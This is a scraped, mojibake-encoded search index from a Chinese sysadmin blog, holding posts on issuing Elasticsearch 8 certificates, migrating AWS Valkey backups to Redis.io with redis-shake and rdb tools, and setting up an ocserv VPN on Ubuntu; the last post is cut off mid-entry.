https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.4.1-linux-x86_64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -zxf elasticsearch-8.4.1-linux-x86_64.tar.gz\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e elasticsearch-8.4.1/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./bin/elasticsearch-certutil ca --pem\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¾—åˆ°CAè¯ä¹¦ï¼Œæ”¾åœ¨å½“å‰ç›®å½•caç›®å½•ä¸‹\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip elastic-stack-ca.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç”Ÿæˆç­¾å‘é…ç½®æ–‡ä»¶\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF \u0026gt;instances.yml \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003einstances:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e   - name: es01\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     dns:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - es01\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - localhost\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     ip:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - 127.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e   - name: kibana\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     dns:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - kibana\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - localhost\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e     ip:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e       - 127.0.0.1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç­¾å‘2ä¸ªpodçš„è¯ä¹¦\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./bin/elasticsearch-certutil cert --ca-cert ca/ca.crt --ca-key ca/ca.key --pem --in instances.yml\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å¾—åˆ°2å¼ è¯ä¹¦å’Œkey\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunzip certificate-bundle.zip\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# ç”Ÿæˆä¸¤ä¸ªç›®å½•ï¼Œes01å’Œkibana\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å‡†å¤‡å¥½è¯ä¹¦ç›®å½•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/elasticsearch/certs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emv ca es01 kibana /data/elasticsearch/certs\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# å‡†å¤‡å¥½æŒä¹…åŒ–å·\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/elasticsearch/kibanadata\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /data/elasticsearch/esdata01\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"äºŒé…ç½®docker-composeyaml\"\u003eäºŒã€é…ç½®docker-compose.yaml\u003c/h5\u003e\n\u003cp\u003e8.18.6ç‰ˆæœ¬çš„docker-compose.yamlæ–‡ä»¶ï¼Œä½äºï¼š/data/elasticsearch/docker-compose.yaml\u003c/p\u003e","title":"ç”Ÿäº§ç¯å¢ƒElasticsearch 8å•èŠ‚ç‚¹Docker-composeçš„å®‰è£…æ–¹æ³•"},{"content":"è¿™è¿˜çœŸæ˜¯ä¸ªå¤§æ´»ï¼Œè€—è´¹äº†æ•´æ•´ä¸€å¤©çš„æ—¶é—´ã€‚\nç©¶å…¶åŸå› æ ¹æœ¬å°±æ˜¯æ— è®ºAWSæ‰˜ç®¡çš„Valkeyè¿˜æ˜¯ç¤¾åŒºçš„Redis.ioï¼Œéƒ½æ˜¯è¢«é­”æ”¹è¿‡çš„é˜‰å‰²ç‰ˆï¼ŒçœŸæ˜¯æ— è¯­ä»–å¦ˆç»™æ— è¯­å¼€é—¨ï¼Œæ— è¯­åˆ°å®¶äº†ï¼\nè¯´ä¸€ä¸‹è¯¦ç»†çš„è¿‡ç¨‹ï¼š\næ¥åˆ°è¿™ä¸ªä»»åŠ¡ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯åŒæ­¥è½¯ä»¶redis-Gunyu\nhttps://github.com/mgtv-tech/redis-GunYu\nç»“æœæ˜¯å¤±è´¥ï¼ŒåŸå› å¾ˆå¥‡è‘©ï¼Œå› ä¸ºaws valkeyæ˜¯å¿…é¡»å¸¦tlsè¿æ¥çš„ï¼ŒGunyuä¸æ”¯æŒï¼Œæ”¾å¼ƒã€‚\nç„¶åæ‰¾åˆ°äº†redis-shake\nhttps://tair-opensource.github.io/RedisShake\nç»“æœè¿˜æ˜¯å¤±è´¥ï¼Œç†ç”±æ˜¯ä¸æ”¯æŒPSyncï¼Œç”¨äº†scan_readerä¹Ÿå¤±è´¥\nç„¶åå°±åˆæƒ³åˆ°äº†ä¸‡èƒ½çš„ChatGPTå’ŒGoogleçš„Geminiï¼Œåˆ†åˆ«ç»™äº†2ä¸ªpythonç¨‹åºï¼Œä¹Ÿæ˜¯å¤±è´¥\nåŸå› æ˜¯ä¸æ”¯æŒMigrateå‘½ä»¤ï¼Œè€Œä¸”valkeyæ˜¯åŸºäºredis 7.2æ”¹çš„ï¼Œè€ŒRedis.ioæ˜¯8.0ï¼Œå‘½ä»¤ä¸å…¼å®¹\nèµ°æŠ•æ— è·¯ä¹‹ä¸‹æƒ³åˆ°äº†rdb-toolsï¼Œå…ˆæŠŠvalkeyåšä¸ªå¤‡ä»½ï¼Œæ”¾åˆ°S3æ¡¶é‡Œ\nvaleky-20250819-0001.rdb valeky-20250819-0002.rdb valeky-20250819-0003.rdb valeky-20250819-0004.rdb valeky-20250819-0005.rdb valeky-20250819-config.json cat valeky-20250819-config.json { \u0026#34;valeky-20250819/valeky-20250819-0002.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;0-5496\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;5234516\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0004.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;5497-8375\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;4340658\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0003.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;10082-16383\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;5962581\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0001.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;8376\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;2218\u0026#34; }, \u0026#34;valeky-20250819/valeky-20250819-0005.rdb\u0026#34; : { \u0026#34;Slots\u0026#34; : \u0026#34;8377-10081\u0026#34;, \u0026#34;rdbSize\u0026#34; : \u0026#34;1540505\u0026#34; } } çœ‹èµ·æ¥æ˜¯5ä¸ªrdbå¤‡ä»½ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”redisä¸åŒçš„slots\nç”¨rdbæ¥è§£æå¤‡ä»½æ–‡ä»¶ï¼Œç»“æœå¤±è´¥ï¼Œå› ä¸ºä¸è®¤è¯†valkey rdbçš„ç‰ˆæœ¬ã€‚\næ²¡åŠæ³•äº†ï¼Œåˆæ‰¾åˆ°äº†è¿™ä¸ªè½¯ä»¶\nhttps://github.com/HDT3213/rdb\nä¸‹è½½åï¼Œé¦–å…ˆæƒ³å¤„ç†æˆjsonæ–‡ä»¶ï¼Œç„¶åçŒå…¥åˆ°redis.io\n./rdb-linux-amd64 -c json -o 0001.json valeky-20250819-0001.rdb å¤±è´¥ï¼Œå› ä¸ºjsonæ–‡ä»¶çŒå…¥çš„æ—¶å€™redis.ioåˆè¢«é˜‰å‰²äº†ï¼Œå‘½ä»¤ä¸æ”¯æŒ\nèµ°æŠ•æ— è·¯ï¼Œèµ°æŠ•æ— è·¯ï¼Œèµ°æŠ•æ— è·¯å•Šï¼ï¼ï¼æ¬²å“­æ— æ³ªï¼Œæ¬²å“­æ— æ³ªï¼Œæ¬²å“­æ— æ³ªå•Šï¼ï¼ï¼\næ²¡åŠæ³•äº†ï¼Œç”¨redis-shakeæŠŠrdbæ–‡ä»¶é€ä¸ªçŒè¿›å»\n[rdb_reader] filepath = \u0026#34;/root/redis/rdbs/valeky-20250819-0001.rdb\u0026#34; [redis_writer] cluster = false address = \u0026#34;redis-22222.c1.ap-southeast-1-1.ec2.redns.redis-cloud.com:22222\u0026#34; username = \u0026#34;default\u0026#34; password = \u0026#34;ABCDEFG\u0026#34; tls = false æ‰§è¡Œäº†5æ¬¡ï¼Œå°±å¯ä»¥äº†ã€‚\nåç»­å•Šï¼šå¯ä»¥å…ˆå»ä¸‹ä¸ªrdt\nhttps://github.com/leonchen83/redis-rdb-cli/\næŠŠ5ä¸ªrdbåˆæˆä¸€ä¸ªï¼Œç„¶åå†çŒå…¥ã€‚\n./rdt -m ../../valeky-20250819-0001.rdb ../../valeky-20250819-0002.rdb ../../valeky-20250819-0003.rdb ../../valeky-20250819-0004.rdb ../../valeky-20250819-0005.rdb -o all.rdb çœŸçš„æ˜¯ç´¯æ­»äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250820-aws_valkey_to_redis_io/","summary":"\u003cp\u003eè¿™è¿˜çœŸæ˜¯ä¸ªå¤§æ´»ï¼Œè€—è´¹äº†æ•´æ•´ä¸€å¤©çš„æ—¶é—´ã€‚\u003c/p\u003e\n\u003cp\u003eç©¶å…¶åŸå› æ ¹æœ¬å°±æ˜¯æ— è®ºAWSæ‰˜ç®¡çš„Valkeyè¿˜æ˜¯ç¤¾åŒºçš„Redis.ioï¼Œéƒ½æ˜¯è¢«é­”æ”¹è¿‡çš„é˜‰å‰²ç‰ˆï¼ŒçœŸæ˜¯æ— è¯­ä»–å¦ˆç»™æ— è¯­å¼€é—¨ï¼Œæ— è¯­åˆ°å®¶äº†ï¼\u003c/p\u003e\n\u003cp\u003eè¯´ä¸€ä¸‹è¯¦ç»†çš„è¿‡ç¨‹ï¼š\u003c/p\u003e\n\u003cp\u003eæ¥åˆ°è¿™ä¸ªä»»åŠ¡ï¼Œé¦–å…ˆæƒ³åˆ°çš„æ˜¯åŒæ­¥è½¯ä»¶redis-Gunyu\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/mgtv-tech/redis-GunYu\"\u003ehttps://github.com/mgtv-tech/redis-GunYu\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç»“æœæ˜¯å¤±è´¥ï¼ŒåŸå› å¾ˆå¥‡è‘©ï¼Œå› ä¸ºaws valkeyæ˜¯å¿…é¡»å¸¦tlsè¿æ¥çš„ï¼ŒGunyuä¸æ”¯æŒï¼Œæ”¾å¼ƒã€‚\u003c/p\u003e\n\u003cp\u003eç„¶åæ‰¾åˆ°äº†redis-shake\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tair-opensource.github.io/RedisShake\"\u003ehttps://tair-opensource.github.io/RedisShake\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eç»“æœè¿˜æ˜¯å¤±è´¥ï¼Œç†ç”±æ˜¯ä¸æ”¯æŒPSyncï¼Œç”¨äº†scan_readerä¹Ÿå¤±è´¥\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250820141906654\" loading=\"lazy\" src=\"/posts/20250820-aws_valkey_to_redis_io/image-20250820141906654.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åå°±åˆæƒ³åˆ°äº†ä¸‡èƒ½çš„ChatGPTå’ŒGoogleçš„Geminiï¼Œåˆ†åˆ«ç»™äº†2ä¸ªpythonç¨‹åºï¼Œä¹Ÿæ˜¯å¤±è´¥\u003c/p\u003e\n\u003cp\u003eåŸå› æ˜¯ä¸æ”¯æŒMigrateå‘½ä»¤ï¼Œè€Œä¸”valkeyæ˜¯åŸºäºredis 7.2æ”¹çš„ï¼Œè€ŒRedis.ioæ˜¯8.0ï¼Œå‘½ä»¤ä¸å…¼å®¹\u003c/p\u003e\n\u003cp\u003eèµ°æŠ•æ— è·¯ä¹‹ä¸‹æƒ³åˆ°äº†rdb-toolsï¼Œå…ˆæŠŠvalkeyåšä¸ªå¤‡ä»½ï¼Œæ”¾åˆ°S3æ¡¶é‡Œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0001.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0002.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0003.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0004.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-0005.rdb\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evaleky-20250819-config.json\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat valeky-20250819-config.json \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0002.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;0-5496\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;5234516\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0004.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;5497-8375\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;4340658\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0003.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;10082-16383\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;5962581\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0001.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;8376\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;2218\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;valeky-20250819/valeky-20250819-0005.rdb\u0026#34;\u003c/span\u003e : \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;Slots\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;8377-10081\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;rdbSize\u0026#34;\u003c/span\u003e : \u003cspan class=\"s2\"\u003e\u0026#34;1540505\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eçœ‹èµ·æ¥æ˜¯5ä¸ªrdbå¤‡ä»½ï¼Œæ¯ä¸ªæ–‡ä»¶å¯¹åº”redisä¸åŒçš„slots\u003c/p\u003e\n\u003cp\u003eç”¨rdbæ¥è§£æå¤‡ä»½æ–‡ä»¶ï¼Œç»“æœå¤±è´¥ï¼Œå› ä¸ºä¸è®¤è¯†valkey rdbçš„ç‰ˆæœ¬ã€‚\u003c/p\u003e\n\u003cp\u003eæ²¡åŠæ³•äº†ï¼Œåˆæ‰¾åˆ°äº†è¿™ä¸ªè½¯ä»¶\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/HDT3213/rdb\"\u003ehttps://github.com/HDT3213/rdb\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eä¸‹è½½åï¼Œé¦–å…ˆæƒ³å¤„ç†æˆjsonæ–‡ä»¶ï¼Œç„¶åçŒå…¥åˆ°redis.io\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./rdb-linux-amd64 -c json -o 0001.json valeky-20250819-0001.rdb\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¤±è´¥ï¼Œå› ä¸ºjsonæ–‡ä»¶çŒå…¥çš„æ—¶å€™redis.ioåˆè¢«é˜‰å‰²äº†ï¼Œå‘½ä»¤ä¸æ”¯æŒ\u003c/p\u003e","title":"AWSæ‰˜ç®¡çš„Valkeyæ•°æ®è½¬ç§»åˆ°ç¤¾åŒºRedis.ioå»"},{"content":"ç”±äºiosçš„openvpnå¤§é™†åœ°åŒºæ— æ³•å®‰è£…ï¼Œè€Œå‘˜å·¥åˆéœ€è¦æ‰‹æœºæˆ–PCç™»å½•VPNè®¿é—®äº‘ä¸Šçš„èµ„æºï¼Œæ²¡åŠæ³•ï¼Œæ‰¾äº†åˆæ‰¾ï¼Œç»ˆäºï¼Œå‘ç°ciscoçš„vpnè¿˜æ˜¯èƒ½åœ¨è‹¹æœå¸‚åœºä¸‹è½½å®‰è£…çš„ï¼Œé‚£å°±è£…ä¸ªå¼€æºçš„Ocservå§ï¼Œåˆ«è¯´è¿˜æŒºå¥½ï¼Œèƒ½åˆ†ç»„æ§åˆ¶è·¯ç”±çš„å‘å¸ƒï¼Œéå¸¸ä¸é”™\nè®°å½•ä¸€ä¸‹å®‰è£…é…ç½®è¿‡ç¨‹ï¼Œä½¿ç”¨Ubuntu 24.04çš„åº•ç‰ˆï¼š\napt update apt upgrade apt-cache show ocserv apt-get install -y ocserv ocserv --version å®‰è£…æ­¥éª¤å°±å¦‚ä¸Šï¼Œéå¸¸ç®€å•ï¼Œè·Ÿopenvpnä¸€æ ·ï¼Œé…ç½®æ–‡ä»¶å°±ä¸€ä¸ª /etc/ocserv/ocserv.conf, ç¼–è¾‘ä¸€ä¸‹ï¼š\n# è®¤è¯æ–¹å¼ä¸ºç”¨æˆ·åå¯†ç è®¤è¯ auth = \u0026#34;plain[passwd=/etc/ocserv/passwd]\u0026#34; # å¼€æ”¾ç«¯å£ tcp-port = 443 udp-port = 443 # è¯ä¹¦ server-cert = /etc/ocserv/_.rendoumi.com.crt server-key = /etc/ocserv/_.rendoumi.com.key # æœ€å¤šç”¨æˆ·æ•° max-clients = 1024 # ç»‘å®šåŸŸå default-domain = m.rendoumi.com # åˆ†é…çš„åŠ¨æ€ipæ®µ ipv4-network = 10.8.12.0 ipv4-netmask = 255.255.255.0 # ä¸è·¯ç”± no-route = 10.0.0.0/255.0.0.0 no-route = 172.16.0.0/255.240.0.0 no-route = 192.168.0.0/255.255.0.0 # å‘å¸ƒè·¯ç”± route = 10.8.2.15/32 route = 10.10.247.234/32 route = 10.10.240.37/32 è¯´æ˜ï¼šç«¯å£å¼€åœ¨äº†443ç«¯å£ï¼Œè¯ä¹¦ç”¨çš„æ˜¯acmeçš„å…è´¹è¯ä¹¦ï¼ŒåŸŸåæ˜¯m.rendoumi.comï¼Œipæ®µæ˜¯10.8.12.0/24\nç„¶åé¦–å…ˆç§ç½‘è·¯ç”±å…¨ç¦æ­¢ï¼Œç„¶ååªæ”¾äº†3æ¡/32çš„å•ç‹¬ipè·¯ç”±ï¼Œè¿™æ ·å°±å¥½äº†\næœ€åè½¬å‘è®¾ç½®ä¸€ä¸‹ï¼Œè¿™å°æœåŠ¡å™¨çš„å†…ç½‘åœ°å€æ˜¯ 10.10.240.249\n# è®¾ç½®è½¬å‘ cat /etc/sysctl.conf net.ipv4.ip_forward = 1 # è®¾ç½®iptalbes iptables -t nat -A POSTROUTING -s 10.8.12.0/24 -j SNAT --to-source 10.10.240.249 # ç”Ÿæˆç”¨æˆ·è®¤è¯æ–‡ä»¶ ocpasswd -c /etc/ocserv/passwd zhangrr ç„¶åå»IOSä¸‹è½½Cisco secure clientï¼Œç›´æ¥å»ºç«‹m.rendoumi.comçš„è¿æ¥ï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œå°±å¯ä»¥è¿æ¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20250819-oserv_vpn/","summary":"\u003cp\u003eç”±äºiosçš„openvpnå¤§é™†åœ°åŒºæ— 